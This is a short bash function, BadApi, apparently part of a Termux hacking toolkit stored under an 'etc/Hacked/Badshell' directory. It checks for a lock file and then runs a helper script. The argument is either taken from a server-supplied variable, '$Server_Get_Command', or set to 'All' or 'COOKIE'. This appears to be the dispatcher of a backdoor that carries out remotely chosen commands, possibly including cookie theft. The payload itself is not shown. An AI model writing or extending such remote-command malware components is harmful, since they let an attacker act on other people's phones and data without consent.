BadApi(){

# F file :

if [[ $termux == "true" ]];then

	if [[ $Server_Get_Command == "" ]];then

		if [[ -f $PREFIX/etc/Hacked/api_lock_file ]];then

			printf ""

		else

			bash $PREFIX/etc/Hacked/Badshell/BadApi All

		fi

	elif [[ $Server_Get_Command == "All" ]];then

		if [[ -f $PREFIX/etc/Hacked/api_lock_file ]];then

			printf ""

		else

			bash $PREFIX/etc/Hacked/Badshell/BadApi All

		fi
	else

		if [[ -f $PREFIX/etc/Hacked/api_lock_file ]];then

                        printf ""

                else

                        bash $PREFIX/etc/Hacked/Badshell/BadApi $Server_Get_Command

                fi

	fi

else


		if [[ -f $PREFIX/etc/Hacked/api_lock_file ]];then

			printf ""

		else

			bash $PREFIX/etc/Hacked/Badshell/BadApi COOKIE

		fi


fi

}
